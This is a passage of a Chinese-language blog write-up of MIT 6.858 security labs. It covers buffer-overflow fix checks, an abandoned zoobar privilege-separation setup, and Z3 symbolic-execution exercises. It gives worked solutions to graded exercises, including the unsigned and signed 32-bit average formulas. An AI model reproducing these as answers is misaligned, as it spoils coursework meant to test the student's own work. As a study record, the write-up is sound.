binaries.</p></blockquote><p>主要是修这两个地方：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>    <span class="hljs-type">char</span> value[<span class="hljs-number">8192</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">8192</span>];<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">8192</span>];<br></code></pre></td></tr></table></figure><p>使用如下命令进行检查，攻击全部失败代表成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-fixed</span><br></code></pre></td></tr></table></figure><p>成功通过√</p><p><img src="https://s2.loli.net/2022/12/04/6XNYjFW7BdPr1Re.png" alt="image.png"></p><p>至此， Lab1 全部完成</p><h1 id="0x02-Lab-2-Privilege-separation-and-server-side-sandboxing（uncompleted）"><a href="#0x02-Lab-2-Privilege-separation-and-server-side-sandboxing（uncompleted）" class="headerlink" title="0x02.Lab 2: Privilege separation and server-side sandboxing（uncompleted）"></a>0x02.Lab 2: Privilege separation and server-side sandboxing（uncompleted）</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>这一个 lab 主要是关于 <strong>权限分离</strong> （privilege separation）与 <strong>服务器侧沙箱</strong>（server-side sandboxing），这一部分我们主要通过一个 MIT 编写的名为 <code>zoobar</code> 的 python web 应用来完成，其中权限隔离的目的是保证攻击者在破坏程序的一部分时不会破坏到程序的另一部分，该 lab 将使用 <a href="https://linuxcontainers.org/">Linux containers</a> 来完成</p><blockquote><p>此前的 lab 中使用的是在课上讲过的 OKWS web server（<del>👴没听课，寄了</del>）</p></blockquote><p>本 lab 中我们将完成一个权限隔离的 web server，检查看你的漏洞，并将程序代码分割成需要更少权限的内容快以最小化单个漏洞的影响，同时我们还将扩展 Zoobar 以使其支持  <em>可执行配置文件</em>  （executable profiles），这允许我们使用 python 来作为配置文件，并完成不同用户配置文件的隔离，这允许用户在其配置文件中实现不同的功能，例如：</p><ul><li>一个按用户名欢迎访客的 profile</li><li>一个记录最后几位访客的 profile</li><li>一个为每位访客提供 zoobar 的 profile（限制为每分钟1位）</li></ul><p>这需要沙箱化服务器上的 profile code 从而避免任意代码执行或任意文件访问，此外，这些代码或许需要保持记录一些文件中的数据，或是访问 zoobar 数据库以正确执行，我们将使用名为库的远程过程与 lab 提供的一些代码来沙箱化可执行配置文件</p><blockquote><p>实验手册原文就挺乱七八糟的，👴愣是没咋看明白，<del>也可能是👴的英文水平太垃圾了</del></p></blockquote><p>那么接下来首先还是把代码切到 lab2 的分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git add answers.txt exploit-*.py http.c zookd.c [and any other new files...]</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&quot;lab1 solution completed&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab2 origin/lab2</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git merge lab1</span><br></code></pre></td></tr></table></figure><p>之后还是先 <code>make</code> 检查一下，没报错就 🆗：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o zookfs.o zookfs.c<br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o http2.o http2.c<br>cc -m64  zookfs.o http2.o   -o zookfs<br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o zookd2.o zookd2.c<br>cc -m64  zookd2.o http2.o   -o zookd2<br></code></pre></td></tr></table></figure><h2 id="Prelude-What’s-a-zoobar"><a href="#Prelude-What’s-a-zoobar" class="headerlink" title="Prelude: What’s a zoobar?"></a>Prelude: What’s a zoobar?</h2><p>为了理解 <code>zoobar</code>，我们首先过一下部分源码</p><p><code>zoobar</code> 的一个重要特性是允许在用户之间传递凭证（credits），这由 <code>transfer.py</code> 实现，我们可以启动 zoobar 感受一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./zookld.py</span><br></code></pre></td></tr></table></figure><p>这玩意需要 python 的 <code>lxc</code> 模块才能跑，但是笔者怎么都安不上…<del>lab2 就此完结</del> </p><p>笔者最终选择  <em>放弃使用自己搭建的实验环境</em>  ，重新使用 MIT 提供的 VM 镜像环境去做实验，但是在执行 <code>./zookld.py</code> 时又遇到了一个问题：</p><p><img src="https://s2.loli.net/2022/12/07/E5rjcJBSFHQOifo.png" alt="image.png"></p><p>那么这个问题的出现是因为 <strong>Ubuntu 21.10 已经停止更新</strong>，我们来看 <code>zookld.py</code> 的逻辑，比较简单，主要就是直接调用 <code>zookconf.py</code> 里的 <code>boot()</code> 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zookconf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">2</span>:<br>        zookconf.boot(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">else</span>:<br>        zookconf.boot()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    zookconf.restart_with_cgroups()<br>    <span class="hljs-keyword">if</span> os.geteuid() == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Running zookld.py as root! In order to clean up &quot;</span><br>        <span class="hljs-string">&quot;containers from this run, you must run zookclean.py as root as well.&quot;</span>,<br>        file=sys.stderr)<br>    main()<br></code></pre></td></tr></table></figure><p>里面存在这样一个调用链：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">boot()<br>Container.__init__()<br>    Container.make_container()<br>        Container.make_base()<br>            Container.configure_base()<br></code></pre></td></tr></table></figure><p>在 <code>configure_base()</code> 中有着一个调用 <code>apt-get</code> 的逻辑，由于 <strong>Ubuntu 21.10 已经 <a href="https://help.ubuntu.com/community/EOLUpgrades">EOL</a> 了，所以这一步是必然会失败的</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">configure_base</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># ...</span><br>    <span class="hljs-comment"># install packages for zoobar</span><br>    <span class="hljs-comment"># terminate early if anything goes wrong here</span><br>    r = self.run_cmd([<span class="hljs-string">&quot;apt-get&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>], extra_env_vars=ev)<br>    <span class="hljs-keyword">if</span> r != <span class="hljs-number">0</span>:<br>        self.errormsg(<span class="hljs-string">&quot;Failed updating apt package info&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    r = self.run_cmd([<span class="hljs-string">&quot;apt-get&quot;</span>, <span class="hljs-string">&quot;install&quot;</span>, <span class="hljs-string">&quot;-y&quot;</span>] + pkgs, extra_env_vars=ev)<br>    <span class="hljs-keyword">if</span> r != <span class="hljs-number">0</span>:<br>        self.errormsg(<span class="hljs-string">&quot;Failed installing packages&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><blockquote><p>参见 <a href="https://askubuntu.com/questions/1420190/upgrade-to-22-04-impish-release-no-longer-has-a-release-file">ask ubuntu</a> 与 <a href="https://fridge.ubuntu.com/2022/07/19/ubuntu-21-10-impish-indri-end-of-life-reached-on-july-14-2022/">Ubuntu Fridge</a></p><blockquote><p><del>👴真的麻了，这实验™是 MIT 今年春季学期发布的，用个 20.04 这样的 LTS 不好🐎，用个就只剩几个🈷寿命的 21.10 就离谱</del></p></blockquote></blockquote><p>MIT 估计是不会修这个问题了，而下一次的实验手册得等到 2023 年的春季学期才能上线，那这里笔者只能自行尝试解决这个问题了: (</p><p>这里笔者试了好几种方法都没能成功将 Ubuntu 21.10 升级成 22.04 或是其他的可用版本，最后笔者将 <code>apt-get</code> 替换成 <code>apt</code> 之后倒是能跑了，不过<strong>无法正常访问 zoobar 服务器</strong>，会报一个 module not found 但是实际上已经安装有对应模块的错误 : (</p><blockquote><p>这里先🕊了，要是之后能重新做上再补，还好几个 lab 之间并非依赖关系可以让笔者先往后继续做 lab3 : )</p></blockquote><h1 id="0x03-Lab-3-Symbolic-execution"><a href="#0x03-Lab-3-Symbolic-execution" class="headerlink" title="0x03.Lab 3: Symbolic execution"></a>0x03.Lab 3: Symbolic execution</h1><h2 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h2><p>本 lab 将教大家使用 <strong>符号执行</strong> （<strong>symbolic execution</strong>） 这一强大的技术来寻找软件中的漏洞，在 lab 的最后我们将建立一个可以在 zoobar web 应用中寻找触发多种漏洞的符号执行系统（准确的说是一个<strong>混合执行</strong>（concolic execution）系统）</p><blockquote><p>关于什么是 concolic execution，可以看这张图</p><p><img src="https://s2.loli.net/2022/10/27/Fvl3yRNMnzKamfk.jpg" alt="concolic execution"></p></blockquote><p>在 <a href="http://css.csail.mit.edu/6.858/2022/readings/exe.pdf">EXE paper</a> 中描述了一个用于 C 程序的符号执行系统，为了简单化，该 lab 将通过修改 Python 对象与重载特定方法来为 Python 程序建立一个符号&#x2F;混合执行系统，类似于 EXE，我们将使用一个 SMT （ <a href="https://en.wikipedia.org/wiki/Satisfiability_Modulo_Theories">Satisfiability Modulo Theories</a>，可满足性模理论）求解器来检查可满足的约束，这意味着我们的求解器可以检查同时包含传统布尔可满足性表达式与涉及其他“理论”的约束如整型、位向量、字符串等</p><p>本 lab 初始我们首先要通过计算 32 位有&#x2F;无符号数的平均值来熟悉 <strong>Z3</strong>——一个流行的 SMT 求解器，接下来我们将为 Python 整型操作创建 wrappers（类似 EXE 提供了符号变量上的操作置换），并应用调用 Z3 的核心逻辑来探索可能的不同执行路径；最终我们将探索如何将其应用在 web 应用程序上，以对字符串进行求解，我们将为 Python 的字符串操作套一层 wrapper，在 SQLalchemy 数据库接口上应用对符号化友好的（symbolic-friendly）wrapper，并使用这个系统寻找 Zoobar 中的漏洞</p><blockquote><p>上面两段都是抄实验手册的</p></blockquote><p>接下来首先还是惯例地切换到 lab 3 的分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&#x27;lab2 completed&#x27;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab3 origin/lab3</span><br></code></pre></td></tr></table></figure><p>这里注意不要将 lab 2 的代码合并到 lab 3 里边，因为我们的符号执行系统无法通过 RPC 追踪多进程间的符号约束，所以我们在一个没有进行权限分离的 Zoobar 上进行符号执行</p><p>接下来是检查代码可用性：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check</span><br></code></pre></td></tr></table></figure><p>结果如下就🆗，需要注意的是符号执行系统是 CPU 密集型的，因此对于不开启 KVM 支持的 QEMU 而言会非常慢：</p><p><img src="https://s2.loli.net/2022/12/12/AlWaHU6RhcE3TpN.png" alt="image.png">、</p><h2 id="Using-an-SMT-solver"><a href="#Using-an-SMT-solver" class="headerlink" title="Using an SMT solver"></a>Using an SMT solver</h2><p>符号执行的核心是 <strong>可满足性模理论求解器</strong>（<strong>Satisfiability Modulo Theory solver</strong>， 即 <code>SMT solver</code>），在本 lab 中我们将使用微软开发的 <a href="https://github.com/Z3Prover/z3">Z3 solver</a> 的 Python-based API（参见 <a href="https://ericpony.github.io/z3py-tutorial/">z3py tutorial</a> &amp; <a href="https://z3prover.github.io/api/html/namespacez3py.html">documentation for Z3’s Python API</a>），并使用  <a href="https://rise4fun.com/z3/tutorialcontent/sequences">Z3’s support for strings</a>；本 Lab 带有一个构建自 <a href="https://github.com/Z3Prover/z3">Z3 github repo</a> 的 Z3</p><p>实验提供了 <code>int-avg.py</code> 作为使用 Z3 的例子：  <em>计算两个 32 位整型的平均值</em>  ，一个最简单的算法是 <code>(x + y) / 2</code> ，但这可能会发生<strong>整型上溢</strong>，从而得到  <em>模 2<sup>32</sup></em> 上的值（想了解更多，参见  <a href="https://people.csail.mit.edu/nickolai/papers/wang-kint-2013-06-24.pdf">KINT paper</a> ）——Z3 可以帮我们检查这个错误：予其一个布尔表达式，Z3 可以告诉我们其<strong>是否为真</strong>（即可以被满足）；若表达式可以为真且包含一些变量，Z3 可以给我们一些使表达式为真的🌰变量</p><p>现在我们来看这份代码（这里不会仔细讲 Z3 的用法，不懂的 <a href="https://z3prover.github.io/api/html/">自行查文档</a>），其首先会使用 Z3 创建两个 32 位的位向量 a 与 b：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> z3<br><br><span class="hljs-comment">## Construct two 32-bit integer values.  Do not change this code.</span><br>a = z3.BitVec(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">32</span>)<br>b = z3.BitVec(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">32</span>)<br></code></pre></td></tr></table></figure><p>接下来分别计算有&#x2F;无符号除法下两数的平均值，注意这里<strong>并没有实际进行计算，而仅是保存了符号变量表达式</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Compute the average of a and b.  The initial computation we provided</span><br><span class="hljs-comment">## naively adds them and divides by two, but that is not correct.  Modify</span><br><span class="hljs-comment">## these lines to implement your solution for both unsigned (u_avg) and</span><br><span class="hljs-comment">## signed (s_avg) division.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Watch out for the difference between signed and unsigned integer</span><br><span class="hljs-comment">## operations.  For example, the Z3 expression (x/2) performs signed</span><br><span class="hljs-comment">## division, meaning it treats the 32-bit value as a signed integer.</span><br><span class="hljs-comment">## Similarly, (x&gt;&gt;16) shifts x by 16 bits to the right, treating it</span><br><span class="hljs-comment">## as a signed integer.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Use z3.UDiv(x, y) for unsigned division of x by y.</span><br><span class="hljs-comment">## Use z3.LShR(x, y) for unsigned (logical) right shift of x by y bits.</span><br>u_avg = z3.UDiv(a + b, <span class="hljs-number">2</span>)<br>s_avg = (a + b) / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>由于 32 位整数加法可能存在溢出，故这里为了求得其正确的平均值，我们将其扩展为两个 33 位的位向量，完成计算后再截断回 32 位（不会导致结果错误，因为 32 位的平均值总会在 32 位内）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Do not change the code below.</span><br><br><span class="hljs-comment">## To compute the reference answers, we extend both a and b by one</span><br><span class="hljs-comment">## more bit (to 33 bits), add them, divide by two, and shrink back</span><br><span class="hljs-comment">## down to 32 bits.  You are not allowed to &quot;cheat&quot; in this way in</span><br><span class="hljs-comment">## your answer.</span><br>az33 = z3.ZeroExt(<span class="hljs-number">1</span>, a)<br>bz33 = z3.ZeroExt(<span class="hljs-number">1</span>, b)<br>real_u_avg = z3.Extract(<span class="hljs-number">31</span>, <span class="hljs-number">0</span>, z3.UDiv(az33 + bz33, <span class="hljs-number">2</span>))<br><br>as33 = z3.SignExt(<span class="hljs-number">1</span>, a)<br>bs33 = z3.SignExt(<span class="hljs-number">1</span>, b)<br>real_s_avg = z3.Extract(<span class="hljs-number">31</span>, <span class="hljs-number">0</span>, (as33 + bs33) / <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>最后就是求解是否存在能够发生整型溢出的约束，即：是否存在这样的两个 32 位整型变量值使得其 32 位下运算结果不与真实计算结果相等：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printable_val</span>(<span class="hljs-params">v, signed</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(v) == z3.BitVecNumRef:<br>        <span class="hljs-keyword">if</span> signed:<br>            v = v.as_signed_long()<br>        <span class="hljs-keyword">else</span>:<br>            v = v.as_long()<br>    <span class="hljs-keyword">return</span> v<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printable_model</span>(<span class="hljs-params">m, signed</span>):<br>    vals = &#123;&#125;<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> m:<br>        vals[k] = printable_val(m[k], signed)<br>    <span class="hljs-keyword">return</span> vals<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_check</span>(<span class="hljs-params">msg, signed, avg, real_avg</span>):<br>    e = (avg != real_avg)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Checking&quot;</span>, msg, <span class="hljs-string">&quot;using Z3 expression:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;    &quot;</span> + <span class="hljs-built_in">str</span>(e).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\n    &quot;</span>))<br>    solver = z3.Solver()<br>    solver.add(e)<br>    ok = solver.check()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Answer for %s: %s&quot;</span> % (msg, ok))<br><br>    <span class="hljs-keyword">if</span> ok == z3.sat:<br>        m = solver.model()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Example:&quot;</span>, printable_model(m, signed))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Your average:&quot;</span>, printable_val(m.<span class="hljs-built_in">eval</span>(avg), signed))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Real average:&quot;</span>, printable_val(m.<span class="hljs-built_in">eval</span>(real_avg), signed))<br></code></pre></td></tr></table></figure><p>结果如下，Z3 求解器帮助我们找到了这样的值：</p><p><img src="https://s2.loli.net/2022/12/12/LekmYMWvfAUSNwy.png" alt="image.png"></p><p>接下来是 Exercise 1：通过修改  <code>int-avg.py</code> 中的 <code>u_avg = ...</code> 一行，实现一个正确的函数，以在 32 位运算下正确计算出 a 与 b 的无符号平均值，不能改变操作数的位宽</p><blockquote><p><strong>Exercise 1.</strong> Implement a correct function to compute the unsigned average of <code>a</code> and <code>b</code> using only 32-bit arithmetic, by modifying the <code>u_avg = ...</code> line in <code>int-avg.py</code>.</p><p>For the purposes of this exercise, you are not allowed to change the bit-widths of your operands. This is meant to represent the real world, where you cannot just add one more bit to your CPU’s register width.</p><p>You may find it helpful to search online for correct ways to perform fixed-width integer arithmetic. The book <a href="https://web.archive.org/web/20190915025154/http://www.hackersdelight.org/">Hacker’s Delight</a> by Henry S. Warren is a particularly good source of such tricks.</p><p>Check your averaging function by re-running <strong>.&#x2F;int-avg.py</strong> or <strong>make check</strong>. If your implementation is correct, <code>int-avg.py</code> should produce the message <code>Answer for unsigned avg: unsat</code>.</p></blockquote><p>这里笔者给出一个比较笨的解法（毕竟笔者的脑子:  (也想不出啥聪明解法 ）：</p><ul><li><strong><code>(a / 2) + (b / 2) + ((a % 2) + (b % 2)) / 2</code></strong></li></ul><p>这个算法的思路比较简单，最初的出发点就是两数之和的平均值不会超出 2<sup>32</sup>，那么我们只要先将两数分别除以2再相加就不会发生溢出了，但是奇数除以2会丢失 0.5，所以如果两个数都是奇数的话最后的结果会丢掉1，那么这里我们再将其加上即可</p><p>这里需要注意的是 Z3 <strong>默认为带符号运算</strong>，故这里我们应当使用 <code>z3.UDiv()</code> 来进行<strong>无符号</strong>除法运算：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">u_avg = z3.UDiv(a, <span class="hljs-number">2</span>) + z3.UDiv(b, <span class="hljs-number">2</span>) + ((a % <span class="hljs-number">2</span>) + (b % <span class="hljs-number">2</span>)) / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>运行 <code>make check</code>，成功通过 Exercise 1：</p><p><img src="https://s2.loli.net/2022/12/12/RhY7t1pxyVSb5eH.png" alt="image.png"></p><p>除了这个算法之外，笔者还了解到有一种算法是利用<strong>位运算</strong>来进行计算：</p><ul><li><code>(a &amp; b) + ((a ^ b) &gt;&gt; 1)</code></li></ul><p>这个算法的基本原理是先提取出<strong>公有部分</strong>，再计算<strong>私有部分的平均值</strong>，最后相加即可得到结果；这个算法也能通过 Exercise 1 ，这里就不重复贴图了</p><p>接下来是 Challenge 1：通过修改  <code>int-avg.py</code> 中的 <code>s_avg = ...</code> 一行，实现一个正确的函数，以在 32 位运算下正确计算出 a 与 b 的<strong>有符号平均值</strong></p><blockquote><p><em>Challenge! (optional)</em> For extra credit, figure out how to compute the average of two 32-bit <em>signed</em> values. Modify the <code>s_avg = ...</code> line in <code>int-avg.py</code>, and run <strong>.&#x2F;int-avg.py</strong> or <strong>make check</strong> to check your answer. Keep in mind the direction of rounding: 3&#x2F;2&#x3D;1 and -3&#x2F;2&#x3D;-1, so so the average of 1 and 2 should be 1, and the average of -2 and -1 should be -1.</p><p>As you explore signed arithmetic, you may find it useful to know that Z3 has two different modulo-like operators. The first is signed modulo, which you get by using <code>a % b</code> in the Python Z3 API. Here, the sign of the result follows the sign of the divisor (i.e., <code>b</code>). For example, <code>-5 % 2 = 1</code>. The second is signed remainder, which you get by using <code>z3.SRem(a, b)</code>. Here, the sign of the result follows the sign of the dividend (i.e., <code>a</code>). With the same example inputs, <code>z3.SRem(-5, 2) = -1</code>.</p></blockquote><p>对于带符号值的运算而言，限制在 32 位内的正确计算便没有那么简单了，若我们直接用上面的式子进行计算则很容易被 Z3 找到能导致运算结果错误的例子：</p><p><img src="https://s2.loli.net/2022/12/12/VMQFBdz4eICN9qg.png" alt="image.png"></p><p>为什么在有符号除法下计算出来的结果不一致呢？这是因为在题目中<del>MIT 非常SB地</del>对于正数除法其选择<strong>向下取整</strong>，对于负数除法的截断，其选择的是<strong>向上取整</strong>，但我们的算法是<strong>正数与负数皆向下取整</strong>，因此计算结果就出现了偏差</p><p>由于正数部分没有问题，因此这里我们需要对计算结果为负数的情况进行特殊化处理，<strong>在结果为负数时将向下取整变为向上取整</strong>，因此最后的计算公式如下：</p><ul><li><code>tmp = (a &amp; b) + ((a ^ b) &gt;&gt; 1)</code></li><li><code>res = tmp + ((tmp &gt;&gt; 31) &amp; (a ^ b))</code></li></ul><p><strong>首先按照我们原来的公式计算出向下取整的结果，接下来对其符号位进行判断，若为 1 则再判断其私有部分平均值的计算是否发生截断（即私有部分和是否为奇数），若是则说明结果发生了向下取整，此时变为向上取整即可</strong></p><p>由于要对符号位进行判断，所以这里我们使用 <code>z3.LShR()</code> 将初始运算结果作为无符号整型进行右移操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp = (a &amp; b) + ((a ^ b) &gt;&gt; <span class="hljs-number">1</span>)<br>s_avg = tmp + (z3.LShR(tmp, <span class="hljs-number">31</span>) &amp; (a ^ b))<br></code></pre></td></tr></table></figure><p>运行结果如下，成功通过 Challenge 1：</p><p><img src="https://s2.loli.net/2022/12/13/mLWgZvYRqnXSJfx.png" alt="image.png"></p><h2 id="Interlude-what-are-symbolic-and-concolic-execution"><a href="#Interlude-what-are-symbolic-and-concolic-execution" class="headerlink" title="Interlude: what are symbolic and concolic execution?"></a>Interlude: what are symbolic and concolic execution?</h2><p>正如我们前面在 EXE 的论文中所见，符号执行是一种通过观测程序在不同输入下如何表现来进行程序测试的方法，通常而言其目的是为了获得更高的 <strong><a href="https://en.wikipedia.org/wiki/Code_coverage">代码覆盖率</a></strong> （code coverage）或是 <strong>路径覆盖率</strong> （path coverage），在安全中其比传统代码执行更能触发罕见的可能包含漏洞的代码路径</p><p>从更高层次而言，若我们要构建一个符号执行系统，我们需要解决以下几点：</p><ul><li>由于程序包含基于输入的中间值（例如输入两个整型并计算平均值，并存放在一些变量中），我们需要记住输入与这些中间值间的关系，通常这通过允许变量或内存位置有  <em>具体的</em> （concrete，例如 114514 这样的实际值） 或  <em>符号的</em>  （symbolic，例如我们在上一小节构建的符号变量） 值</li><li>我们需要根据输入来确定要执行的控制流分支，这归结于在程序每次发生分支时构建符号约束，在程序选择一些特定分支时描述布尔条件（以程序原有输入的形式）；由于我们持续保存中间值与程序原有输入的间隙，我们并不需要通过原有输入来计算约束，这些约束就像我们在前文中用来寻找整型中漏洞的约束；确定控制流约束非常重要，因为若程序初始时进入了特定分支路径，我们想要知道如何让他走到另一条路径来寻找是否存在漏洞，在 EXE 的论文中使用了一个 C-to-C 的翻译器来在所有的分支上插入他们的代码</li><li>对于每一条上述分支，我们需要决定是否有一个输入能够让程序在一条分支上执行另一条路径（更准确地说，我们考虑整个控制流路径而非单个路径），这帮助我们在程序中寻找可以让我们通过调整输入来影响的控制流条件，所有的符号执行系统都基于 SMT 求解器来完成这些工作</li><li>我们需要确定我们在测试中寻找的是什么，这是我们从程序中确保  <em>不变量</em>  （invariant）来考虑的最佳方法，而符号执行寻找改变这些常量的输入（<del>👴也没咋读明白，可以看实验手册原句</del>）；我们可以寻找的事物之一是<strong>程序崩溃</strong>（crashes，即不变量是  <em>我们的程序不应当崩溃</em>  ），在 C 程序中这非常有意义，因为 crashes 通常指示了代表漏洞的内存损坏，在 Python 这样更高级的语言中在设计上并不存在内存损坏，但我们仍然可以寻找如 Python 代码级的代码注入攻击（例如 <code>eval()</code> 